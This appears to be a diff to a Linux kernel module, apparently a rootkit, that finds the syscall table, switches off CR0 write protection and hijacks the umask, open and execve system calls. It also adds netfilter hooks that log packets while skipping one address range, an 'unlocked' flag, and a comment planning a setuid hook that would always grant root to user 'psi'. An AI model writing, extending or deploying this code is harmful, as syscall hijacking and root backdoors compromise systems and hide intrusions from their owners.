@@ -11,10 +11,11 @@
 #include <asm/uaccess.h>
 #include <linux/slab.h>
 #include <linux/init.h>
-#include <linux/cdev.h>o
+#include <linux/cdev.h>
 #include <linux/init.h>
 #include <linux/rtc.h>
-#include "netfilter.h"
+#include "nmonitor.h"
+int unlocked = 0;
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tyl3rdurd3n");
@@ -28,12 +29,12 @@ MODULE_VERSION("0.0.2");
 
 asmlinkage unsigned long **sys_call_table;
 
-/* Hook Function Prototypes */
+/* Function Prototypes */
 static unsigned long **find_sys_call_table(void);
 asmlinkage int psi_umask(mode_t umask);
 asmlinkage long psi_open(const char __user *filename, int flags, umode_t mode);
 asmlinkage int psi_execve(const char* file,const char* const argv[],const char* const envp[]);
-/* Pointers to Hooked Function Prototypes */
+
 asmlinkage int (*original_umask)(mode_t umask);
 asmlinkage long (*original_recv)(int, void __user *, size_t, unsigned);
 asmlinkage long (*original_sys_open)(const char __user *, int, umode_t);
@@ -41,7 +42,7 @@ asmlinkage int (*original_execve)(const char* file,const char* const argv[],cons
 
 
 
-
+/* 			HOOKING FUNCTIONS				*/
 static unsigned long **find_sys_call_table() {
     unsigned long offset;
     unsigned long **sct;
@@ -54,7 +55,7 @@ static unsigned long **find_sys_call_table() {
     return NULL;
 }
 
-/* 			HOOKING FUNCTIONS				*/
+
 asmlinkage long psi_open(const char __user *filename, int flags,umode_t mode){
 	int len = strlen(filename);
 	// Log go output device what file is being opened
@@ -73,6 +74,10 @@ asmlinkage int psi_execve(const char *file, const char *const argv[], const char
 	return original_execve(file, argv, envp);
 }
 
+
+
+
+// Should hook the setuid function to always work for username psi
 asmlinkage int psi_umask(mode_t umask){
 	printk(KERN_NOTICE "[Ψe]: Someone wants root");
 	return original_umask(umask);
@@ -85,7 +90,7 @@ static int __init psi_start(void){
 	// Get The Address of SYSCALL_TABLE	
 	sys_call_table = find_sys_call_table();
     if(!sys_call_table) { /* operation not permitted */
-		printk(KERN_ERR "[ψ]: Couldn't find sys_call_table.\n");
+		printk(KERN_ERR "Couldn't find sys_call_table.\n");
 		return -EPERM;  
     }
 
@@ -102,7 +107,8 @@ static int __init psi_start(void){
 	// Change the value back in CR0
 	ENABLE_WRITE_PROTECTION;
 
-	/* set hook option for pre routing when packet arrives */
+	/* set hook option for pre routing */
+	/* when pack arrived, hook_recv_fn will be triggered */
 	nfhook_recv.hook = hook_recv_fn;
 	nfhook_recv.hooknum = NF_INET_PRE_ROUTING;	// resigister pre routing hook
 	nfhook_recv.pf = PF_INET;
@@ -112,7 +118,8 @@ static int __init psi_start(void){
 		printk(KERN_INFO "[Ψnx]: Could not register the netfilter receiving hook");
 	}
 
-	/* set hook option for post routing when pack is about to be sent */
+	/* set hook option for post routing */
+	/* when pack is about to be sent, hook_send_fn will be triggered */
 	nfhook_send.hook = hook_send_fn;
 	nfhook_send.hooknum = NF_INET_POST_ROUTING;	// resigister porst routing hook
 	nfhook_send.pf = PF_INET;
@@ -142,6 +149,8 @@ unsigned int hook_recv_fn(void *priv,
 	/* hard coding for demo purpose */
 	/* get ip header from socket buffer we are owned */
 	ip_header = ip_hdr(skb);
+	char IP[16];
+	snprintf(IP,16,"%pI4",&ip_header->saddr);
 
 	/* get different header for different protocol  */
 	switch (ip_header->protocol) {
@@ -151,11 +160,12 @@ unsigned int hook_recv_fn(void *priv,
 			tcp_header = tcp_hdr(skb);
 			/* translate from network bits order to host bits order */
 			dest_port = ntohs(tcp_header->dest);
-	
-			
-			/* print out the information in the header */
-			printk(KERN_INFO "[Ψnx]: Packet received from: %pI4:%d",&(ip_header->saddr), dest_port);
-			break;
+		
+			if (!strstr(IP,"10.23.")){
+				/* print out the information in the header */
+				printk(KERN_INFO "[Ψnx]: Packet received from: %pI4:%d",&(ip_header->saddr), dest_port);
+				break;
+			}
 
 		/* UDP */
 		case IPPROTO_UDP:
@@ -163,14 +173,15 @@ unsigned int hook_recv_fn(void *priv,
 			udp_header = udp_hdr(skb);
 			/* translate from network bits order to host bits order */
 			dest_port = ntohs(udp_header->dest);
-
-			/* print out the information in the header */
-			printk(KERN_INFO "[Ψnx]: Packet received from: %pI4:%d",&(ip_header->saddr),dest_port);
-			break;
+			if (!strstr(IP,"10.23.")){
+				/* print out the information in the header */
+				printk(KERN_INFO "[Ψnx]: Packet received from: %pI4:%d",&(ip_header->saddr),dest_port);
+				break;
+			}
 
 		/* Other protocol like ICMP, RAW, ESP, etc. */
 		default:
-			printk(KERN_INFO "[Ψnx]: Packet received from: %pI4\n", &(ip_header->saddr));
+			// printk(KERN_INFO "[Ψnx]: Packet received from: %pI4\n", &(ip_header->saddr));
 			break;
 	}
 	/* let netfilter accept the incoming pack */
@@ -188,6 +199,9 @@ unsigned int hook_send_fn(void *priv,
 	/* get ip header from socket buffer we are owned */
 	ip_header = ip_hdr(skb);
 
+	char IP[16];
+	snprintf(IP,16,"%pI4",&ip_header->saddr);
+
 	/* get different header for different protocol  */
 	switch (ip_header->protocol) {
 		/* TCP */
@@ -196,12 +210,13 @@ unsigned int hook_send_fn(void *priv,
 			tcp_header = tcp_hdr(skb);
 			/* translate from network bits order to host bits order */
 			dest_port = ntohs(tcp_header->dest);
-			
 
-			/* print out the information in the header */
-			printk(KERN_INFO "[Ψnx]: Packet sent to: %pI4:%d",&(ip_header->saddr), dest_port);
-			break;
-
+			/* drop the pack if it should be blocked */
+			if (!strstr(IP,"10.23.")){
+				/* print out the information in the header */
+				printk(KERN_INFO "[Ψnx]: Packet sent to: %pI4:%d",&(ip_header->saddr), dest_port);
+				break;
+			}
 		/* UDP */
 		case IPPROTO_UDP:
 			/* get udp header if the protocol of the pack is udp */
@@ -210,15 +225,15 @@ unsigned int hook_send_fn(void *priv,
 			dest_port = ntohs(udp_header->dest);
 
 			/* drop the pack if it should be blocked */
-			
-
-			/* print out the information in the header */
-			printk(KERN_INFO "[Ψnx]: Pack sent to: %pI4:%d",&(ip_header->daddr), dest_port);
-			break;
+			if (!strstr(IP,"10.23.")){
+				/* print out the information in the header */
+				printk(KERN_INFO "[Ψnx]: Packet sent to: %pI4:%d",&(ip_header->daddr), dest_port);
+				break;
+			}
 
 		/* Other protocol like ICMP, RAW, ESP, etc. */
 		default:
-			printk(KERN_INFO "[Ψnx]: Packet sent to %pI4\n", &(ip_header->saddr));
+			// printk(KERN_INFO "[Ψnx]: Packet sent to %pI4\n", &(ip_header->saddr));
 			break;
 	}
 	/* let netfilter accept the incoming pack */
